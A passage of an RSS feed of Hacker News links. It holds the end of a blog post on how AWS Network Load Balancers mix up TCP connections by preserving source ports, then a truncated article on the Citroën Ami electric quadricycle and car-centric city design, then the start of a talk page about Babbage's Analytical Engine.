<p><img src="https://www.niels-ole.com/assets/2020/whatthehell.gif" alt="I was thinking: &quot;What the hell&quot;"></p>

<div><div><pre><code>90.63.58.20:36230 -&gt; 18.203.64.15:443 Seq=5432              [RST] 
</code></pre></div></div>
<p>Well, at least the client is as confused as I am and sends an RST. It just sucks that this means our SYN will never be properly answered.</p>

<p>Is the SYN of the new connection overwriting an existing connection in the NLB’s connection table?</p>

<h2 id="the-cause">The cause</h2>

<p>Since I had so much trust in AWS NLBs I first assumed the issue to lie somewhere (anywhere) else. 
I imagined it could theoretically be a faulty switch or a misconfigured NAT gateway on the client side.
But it turned out to be neither of them. It was actually the AWS NLB mixing up the connections.
How can this happen?</p>

<h3 id="cross-az-loadbalancing">Cross AZ-loadbalancing</h3>

<p>When the traffic goes through the NLBs the target IP address get rewritten to the internal IP address of the EC2 instance.</p>

<p><img src="https://www.niels-ole.com/assets/2020/nlb-basic.png" alt="An example of IPs used in the requests to an NLB"></p>

<p>Now how would it look from the client if three connections are created in a round-robin fashion?</p>

<div><div><pre><code>90.63.58.20:20536;34.242.162.234:443
90.63.58.20:36895;18.203.64.15:443
90.63.58.20:60356;52.203.250.3:443
</code></pre></div></div>

<p>Now this looks unproblematic, nice quadruples - no RST packets.
But what happens if we have more and longer-lived connections? Could collisions happen?</p>

<div><div><pre><code>...
90.63.58.20:36230;34.242.162.234:443 let's call this connection A
...
90.63.58.20:36230;18.203.64.15:443   and this one B
...
</code></pre></div></div>

<p>As I said in the background, the kernel ensures that there are no quadruple collisions.
And this is still the case in this case. The same source port can be reused, as long as the target ip or port are different. 
As the connections go to different IPs of the NLB, this is the case… but only from the view of the client.
In the NLB the addresses are translated to an internal IP.
So on the EC2 instance the quadruples look like this:</p>

<div><div><pre><code>...
90.63.58.20:36230;10.54.1.1:443 A
...
90.63.58.20:36230;10.54.1.1:443 B
...
</code></pre></div></div>

<p>Now this looks problematic. Two TCP connections share the same quadruple.
Thus the NLB cannot distinguish between them and sends the packets on either of them.</p>

<h2 id="is-this-a-bug">Is this a bug?</h2>

<p>An ordinary NAT would handle such collisions just fine. 
When a collision is detected, not only the address is translated but also the port.
This makes it possible to handle the complete port range before collisions occur.
NLBs apparently don’t act like NATs. I couldn’t find this spelled out anywhere, but apparently they always preserve the source port. 
This basically means that whenever a client makes more than <em>one</em> connection to the NLB, collisions may occur.
During my research I found out I am <a href="https://medium.com/swlh/nlb-connection-resets-109720accfc6">not the only one irritated by that</a> and that they opened a support ticket and got the confirmation that this is indeed intended behaviour.</p>

<p>In any case I don’t think anyone would derive this from <em>just</em> the docs and TCP knowledge.
There should at least be a big warning sign in <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/userguide/how-elastic-load-balancing-works.html">the documentation</a>.</p>

<h2 id="what-to-do-now">What to do now?</h2>

<p>This issue not only occurs with cross-zone-loadbalancing, but any time two external IPv4-addresses point to the same EC2 instance in AWS.
This includes multiple NLBs pointing at the same target or an instance having both a public IPv4 address and being behind an NLB.</p>

<p>What I take away from this is to never have two NLBs pointed at the same target groups as well as to turn cross-az loadbalancing off for most use-cases.
And never assume that a part of your stack is infallible.</p>

<p>Discuss on <a href="https://news.ycombinator.com/item?id=24856607">Hacker News</a> or <a href="https://www.reddit.com/r/devops/comments/jfxl9o/aws_nlbs_and_the_mixed_up_tcp_connections/">Reddit</a></p>

  </article>
  
  
</div>

      </div>
    </div></div>]]>
            </description>
            <link>https://www.niels-ole.com/cloud/aws/linux/2020/10/18/nlb-resets.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24856607</guid>
            <pubDate>Thu, 22 Oct 2020 10:37:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Citroën Ami and the future of urban transportation]]>
            </title>
            <description>
<![CDATA[
Score 97 | Comments 122 (<a href="https://news.ycombinator.com/item?id=24856541">thread link</a>) | @caskes
<br/>
October 22, 2020 | https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/ | <a href="https://web.archive.org/web/*/https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>When</span> I saw the Ami for the first time I instantly fell in love. Citroën's tiny electric 'citadine' is smart, innovative, and well-designed. Seeing the first press cars zip through the wide boulevards of Paris brought a big smile to my face. But the more I kept thinking about it, the more I started to doubt the purpose of this car. </p>

<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/040c5/amioverview.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Citroën Ami" title="The Citroën Ami" src="https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/a8fee/amioverview.jpg" srcset="https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/35027/amioverview.jpg 180w,
https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/627a5/amioverview.jpg 360w,
https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/a8fee/amioverview.jpg 720w,
https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/b2ead/amioverview.jpg 1080w,
https://www.theturnsignalblog.com/static/260ced86352d8a0a2392c56e7aaebcbe/040c5/amioverview.jpg 1200w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Citroën Ami</figcaption>
  </figure> 
<p>The Ami started life as the AMI ONE C Concept which was a study on new ways to overcome the challenges of designing a small, affordable city car. The two biggest challenges are how to create as much interior space as possible and how to keep the production costs low. Many of the ideas of the concept car have found their way to the Ami production model.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/533d0/onec.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Citroën AMI ONE C Concept was presented at the 2019 Geneva Motor Show" title="The Citroën AMI ONE C Concept was presented at the 2019 Geneva Motor Show" src="https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/a8fee/onec.jpg" srcset="https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/35027/onec.jpg 180w,
https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/627a5/onec.jpg 360w,
https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/a8fee/onec.jpg 720w,
https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/b2ead/onec.jpg 1080w,
https://www.theturnsignalblog.com/static/258806b8ec0a0cc4b335ff7ec371e7a1/533d0/onec.jpg 1280w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Citroën AMI ONE C Concept was presented at the 2019 Geneva Motor Show</figcaption>
  </figure>
<h2>Cost Saving</h2>
<p>The 'usual' cost-saving recipe when creating affordable city cars is to share a production line with other manufacturers. The drawback is that these manufacturers are selling the same car with slightly different design details. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/0f117/similarcars.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Peugeot 107, Citroën C1, and Toyota Aygo share the same production line" title="The Peugeot 107, Citroën C1, and Toyota Aygo share the same production line" src="https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/b85f6/similarcars.png" srcset="https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/aaa28/similarcars.png 180w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/7e1e1/similarcars.png 360w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/b85f6/similarcars.png 720w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/4d206/similarcars.png 1080w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/91a72/similarcars.png 1440w,
https://www.theturnsignalblog.com/static/352b9be3593cda9bb8f5f4e9fc46fd0f/0f117/similarcars.png 1593w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Peugeot 107, Citroën C1, and Toyota Aygo share the same production line</figcaption>
  </figure>
<p>Citroën took a different approach. Instead of sharing a production line, they have come up with ways to create the simplest production line. This limits the variety of the design but instead of trying to hide that, the Ami highlights these limitations.
The clearest example is the exterior bodywork. As you can see from the video below, the exterior is largely made up of only three different bodywork panels.</p>
<video autoplay="" loop="" muted="" playsinline="">  
  <source src="https://www.theturnsignalblog.com/d33ec155f42d337c79d048fb5cec2610/ami.webm" type="video/webm">  
  <source src="https://www.theturnsignalblog.com/8395c6a14cb9a9fa45af5c3129d86bbf/ami.mp4" type="video/mp4">
</video> 
<p>This gives it its quirky look as from far away the car does not seem to have a clear front or backside. The doors have a similar effect. Because they are identical,  they open in opposite directions from each other. Instead of trying to hide these limitations, Citroën shows them off in ads and commercials, celebrating the quirkiness of the car.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/1ca3f/doors.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The doors open in opposite directions" title="The doors open in opposite directions" src="https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/a8fee/doors.jpg" srcset="https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/35027/doors.jpg 180w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/627a5/doors.jpg 360w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/a8fee/doors.jpg 720w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/b2ead/doors.jpg 1080w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/aed33/doors.jpg 1440w,
https://www.theturnsignalblog.com/static/2bddb5921a8d1164184e7aa4ab8fa948/1ca3f/doors.jpg 1920w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The doors open in opposite directions</figcaption>
  </figure>
<p>Citroën was also inspired by the father of mass production, the Ford Model T. Like the Model T, the Ami is only available in one color. Personalization is important to many customers though. So Citroën came up with different sticker sets that the customer can use to personalize the car.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/2faef/stickers.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Ami can be personalized with sticker sets" title="The Ami can be personalized with sticker sets" src="https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/b85f6/stickers.png" srcset="https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/aaa28/stickers.png 180w,
https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/7e1e1/stickers.png 360w,
https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/b85f6/stickers.png 720w,
https://www.theturnsignalblog.com/static/c1d2017f6c6de2dd2f854cc36c9b2e28/2faef/stickers.png 1024w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Ami can be personalized with sticker sets</figcaption>
  </figure>
<p>This smart design philosophy continues in the interior. For example, the side windows are not electric but hinge outward. Citroën like to point out that this was inspired by the 2CV, the spiritual father of the Ami, turning it into a nostalgic feature instead of a limitation. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/9c8ce/window.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The window opens outwards like the 2CV" title="The window opens outwards like the 2CV" src="https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/a8fee/window.jpg" srcset="https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/35027/window.jpg 180w,
https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/627a5/window.jpg 360w,
https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/a8fee/window.jpg 720w,
https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/b2ead/window.jpg 1080w,
https://www.theturnsignalblog.com/static/3d16050b0642f4acfc4a20e8fa7297f0/9c8ce/window.jpg 1111w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The window opens outwards like the 2CV</figcaption>
  </figure>
<p>It is not only for cost-saving though because the space that is normally used to house the window when it is down is now a storage compartment.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/0bd34/doorspace.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The storage compartment in the door" title="The storage compartment in the door" src="https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/a8fee/doorspace.jpg" srcset="https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/35027/doorspace.jpg 180w,
https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/627a5/doorspace.jpg 360w,
https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/a8fee/doorspace.jpg 720w,
https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/b2ead/doorspace.jpg 1080w,
https://www.theturnsignalblog.com/static/98559f3d0da48c3afe32deb59b24be9d/0bd34/doorspace.jpg 1417w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The storage compartment in the door</figcaption>
  </figure>
<p>A big challenge for car companies today is that customers want more expensive technology to be available in the car. The adoption rate of new smartphones is high and customers expect the same level of innovation in their cars. For a cheap city car, it is impossible to provide this.
That is why the Ami does not have a center console but instead, a big smartphone mount. Like this, the Ami leverages the driver's smartphone to offer the same features as premium cars without the cost. Similarly, the car has no speakers. Instead, there is an opening in the dashboard designed to hold a Bluetooth speaker.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/533d0/interior.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The interior of the Ami" title="The interior of the Ami" src="https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/a8fee/interior.jpg" srcset="https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/35027/interior.jpg 180w,
https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/627a5/interior.jpg 360w,
https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/a8fee/interior.jpg 720w,
https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/b2ead/interior.jpg 1080w,
https://www.theturnsignalblog.com/static/97b454670461e9aad6fb1666b16d2179/533d0/interior.jpg 1280w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The interior of the Ami</figcaption>
  </figure>
<p>The few functionalities it does have are a heater (no airconditioning), and a cheap, monochrome cluster screen that shows minimal information like speed, battery level, and time until the next charge. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/1e867/cluster.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The cluster is basic and monochrome" title="The cluster is basic and monochrome" src="https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/a8fee/cluster.jpg" srcset="https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/35027/cluster.jpg 180w,
https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/627a5/cluster.jpg 360w,
https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/a8fee/cluster.jpg 720w,
https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/b2ead/cluster.jpg 1080w,
https://www.theturnsignalblog.com/static/a404f4eda39242b24f91e46f8d16a60c/1e867/cluster.jpg 1268w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The cluster is basic and monochrome</figcaption>
  </figure>
<h2>Interior Space</h2>
<p>Creating a lot of interior space is a huge challenge for small city cars. Thanks to Ami's electric drivetrain, the space that is otherwise used to house the engine, gearbox, and other mechanical parts can now be used for the interior. It also means that the wheels can be placed at the outer edges of the car which not only gives it a tiny turning circle, it also maximizes the interior space. </p>
<p>The many windows of the car allow for a lot of natural light to enter the cabin which helps in making the interior feel big.
Entering the vehicle for the first time feels unreal. The car is much smaller than any other vehicle on the road. With its length of 2.41m and width of 1.29m, it is significantly smaller than a Smart Fortwo (2.69m x 1.66m). But when entering the car, the interior feels so spacious that it seems bigger than the car itself!</p>
<p>Clearly, the Ami is not meant for going on vacation so it does not need to have a big amount of storage space. It does manage to have enough interior space for the things you would bring on short trips.
Due to the packaging of the car, the dashboard reaches quite far to the front of the car. In it, there are different patterns and holders for small items like a water bottle or sunglasses. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/0bd34/dashboard.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The storage system in the dashboard" title="The storage system in the dashboard" src="https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/a8fee/dashboard.jpg" srcset="https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/35027/dashboard.jpg 180w,
https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/627a5/dashboard.jpg 360w,
https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/a8fee/dashboard.jpg 720w,
https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/b2ead/dashboard.jpg 1080w,
https://www.theturnsignalblog.com/static/8a247f22554324ceb5713c2bdad6daf1/0bd34/dashboard.jpg 1417w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The storage system in the dashboard</figcaption>
  </figure>
<p>An idea that directly comes from concept car is to place the passenger seat a bit further back than the driver's seat which creates a space for a backpack in the passenger's footwell.</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/533d0/space.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="There is space for a backpack in the footwell" title="There is space for a backpack in the footwell" src="https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/a8fee/space.jpg" srcset="https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/35027/space.jpg 180w,
https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/627a5/space.jpg 360w,
https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/a8fee/space.jpg 720w,
https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/b2ead/space.jpg 1080w,
https://www.theturnsignalblog.com/static/cf3a98bdf3a19220dbacfcaeb974563c/533d0/space.jpg 1280w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>There is space for a backpack in the footwell</figcaption>
  </figure>
<p>Driving the Ami around Paris, it feels more like a scooter than a car. Thanks to the many windows, you feel more exposed and connected to other road users. It is easier to make eye contact and communicate with cyclists and pedestrians so it is a much friendlier vehicle than a regular car.
Despite the cheap materials, the interior is not an unpleasant place to be. By cleverly creating space and a place for the smartphone, it provides everything you might need for a short trip. It is hard not to love it!</p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/533d0/carmeet.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="Thanks to its size and many windows, it is easy to make eye-contact with others" title="Thanks to its size and many windows, it is easy to make eye-contact with others" src="https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/a8fee/carmeet.jpg" srcset="https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/35027/carmeet.jpg 180w,
https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/627a5/carmeet.jpg 360w,
https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/a8fee/carmeet.jpg 720w,
https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/b2ead/carmeet.jpg 1080w,
https://www.theturnsignalblog.com/static/b32be1c49fda6a0d55c8b49a5703e452/533d0/carmeet.jpg 1280w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Thanks to its size and many windows, it is easy to make eye-contact with others</figcaption>
  </figure>

<p>Citroën has intended the Ami to be a car for the (urban) masses and is trying to give anyone a reason to use one. It is available to buy for around 6000 euros or rent for 20 euros per month after a down payment. Additionally, several car-sharing services will include the Ami in their fleet. It is not only available at Citroën dealerships, but also in France's big electronics retailers Fnac and Darty. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/040c5/fnac.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The Ami on display at a Fnac" title="The Ami on display at a Fnac" src="https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/a8fee/fnac.jpg" srcset="https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/35027/fnac.jpg 180w,
https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/627a5/fnac.jpg 360w,
https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/a8fee/fnac.jpg 720w,
https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/b2ead/fnac.jpg 1080w,
https://www.theturnsignalblog.com/static/ca6ffd627c19a55bbfbfc43630a2e8ca/040c5/fnac.jpg 1200w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The Ami on display at a Fnac</figcaption>
  </figure>
<p>It has a top speed of 45km/h, it can do 75km on a full charge and it takes only 3 hours to charge it in a normal 220v household plug. It is classified as a quadricycle, not a car, so anyone over 14 can legally drive the car in France without a license. </p>
<p>Citroën did not design the car for a specific target audience. But the company does want to tap into the market of families. Citroën expects that almost half of the drivers will be younger than 18. They argue that parents will prefer to have their teenage children race around the city in a vehicle that is much safer than scooters or bicycles. The price of a monthly subscription is similar to a public transportation card or scooter subscription making it an attractive alternative.
The first signs are clearly positive as there are currently waiting lines to test drive one. </p>

<p>So far so good then. The Ami is cheap, well-designed, eco-friendly, and accessible to most of the public. What is not to love? To understand my concerns, we have to dive back in time and look at the bigger picture of city transportation.</p>
<h2>A History Lesson</h2>
<p>Before cars were the main mode of transport, city streets were a place where children played football, where neighbors would run into each other and stop for a chat. They were a place where people spent time and socialized. But at some point, something changed. Paris was one of the first cities where this happened. Between 1853 and 1870 Baron Haussman transformed much of the medieval city center of Paris into a 'healthy' city. This involved tearing down much of the narrow streets to make place for wide boulevards. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/db203/oldvsnewparis.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Old streets of Paris compared to the wide boulevards" title="Old streets of Paris compared to the wide boulevards" src="https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/b85f6/oldvsnewparis.png" srcset="https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/aaa28/oldvsnewparis.png 180w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/7e1e1/oldvsnewparis.png 360w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/b85f6/oldvsnewparis.png 720w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/4d206/oldvsnewparis.png 1080w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/91a72/oldvsnewparis.png 1440w,
https://www.theturnsignalblog.com/static/32911535220a98ed7800f0667852785b/db203/oldvsnewparis.png 1580w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Old streets of Paris compared to the wide boulevards</figcaption>
  </figure>
<p>The side effect was that it allowed horse-drawn carriages to go much faster, resulting in louder, more dangerous streets.
Before, pedestrians ruled the streets and other forms of transportation had to adjust to them. After the transformation though, the wide boulevards switched this around. Check this video from 1890 where this is clearly visible:</p>
<p><iframe src="https://www.youtube.com/embed/fo_eZuOTBNc?start=107" allowfullscreen=""></iframe></p>
<p>After the Second World War, this became even worse when cars were seen as the future of personal transportation. The modernist movement turned entire city centers into highways and parking lots. Suddenly, city streets were not a social place, they were there to get traffic from A to B as quickly and efficiently as possible. Pedestrians, despite being in the majority, were delegated to narrow sidewalks, jaywalking became an offense, and most of the public space was allocated to driving or parking. </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/b2ead/carcentricillustration.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="The effect of car centric culture on the rest of the city" title="The effect of car centric culture on the rest of the city" src="https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/a8fee/carcentricillustration.jpg" srcset="https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/35027/carcentricillustration.jpg 180w,
https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/627a5/carcentricillustration.jpg 360w,
https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/a8fee/carcentricillustration.jpg 720w,
https://www.theturnsignalblog.com/static/761477b1952b8121ea2c960590d34641/b2ead/carcentricillustration.jpg 1080w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>The effect of car centric culture on the rest of the city</figcaption>
  </figure>
<p>Over time we have accepted this as normal but it isn't.  In <a href="https://medium.com/@colville_andersen/the-arrogance-of-space-93a7419b0278">'The Arrogance of Space'</a> Mikael Colville-Anderson describes the unfair distribution of space with Paris as an example:  </p>
<figure>
    <span>
      <a href="https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/d4e2e/arroganceofspace.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Space for pedestrians (blue) vs cars (red) in front of the Eiffel Tower" title="Space for pedestrians (blue) vs cars (red) in front of the Eiffel Tower" src="https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/b85f6/arroganceofspace.png" srcset="https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/aaa28/arroganceofspace.png 180w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/7e1e1/arroganceofspace.png 360w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/b85f6/arroganceofspace.png 720w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/4d206/arroganceofspace.png 1080w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/91a72/arroganceofspace.png 1440w,
https://www.theturnsignalblog.com/static/e665bfb21298c7d3cda507907cbf9586/d4e2e/arroganceofspace.png 2306w" sizes="(max-width: 720px) 100vw, 720px" loading="lazy">
  </a>
    </span>
    <figcaption>Space for pedestrians (blue) vs cars (red) in front of the Eiffel Tower</figcaption>
  </figure>
<p>With the rising importance of global climate change and more recently, the Covid crisis, cities are realizing that the current solution is unsustainable.
A country where this realization has happened a few decades ago is the Netherlands. Like other countries in the '60s, Dutch cities were moving towards car-centric infrastructure. There were plans to destroy much of the historic center of Amsterdam to make way for …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/">https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/</a></em></p>]]>
            </description>
            <link>https://www.theturnsignalblog.com/blog/ami-and-future-of-transportation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24856541</guid>
            <pubDate>Thu, 22 Oct 2020 10:24:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The programming architecture of Babbage's Analytical Engine [video]]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 6 (<a href="https://news.ycombinator.com/item?id=24856235">thread link</a>) | @doener
<br/>
October 22, 2020 | https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas | <a href="https://web.archive.org/web/*/https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">



<div>

<p>
<span></span>
<a href="https://media.ccc.de/search?p=Prof.+Dr.+Raul+Rojas">Prof. Dr. Raul Rojas</a>

</p>
<p>
Playlists:
<a href="https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas/playlist">'vcfb20' videos starting here</a>
/
<a data-method="get" href="https://media.ccc.de/v/vcfb20_-_137_-_de_-_202010101600_-_the_programming_architecture_of_babbages_analytical_engine_-_prof_dr_raul_rojas/audio">audio</a></p>
<!-- %h3 About -->
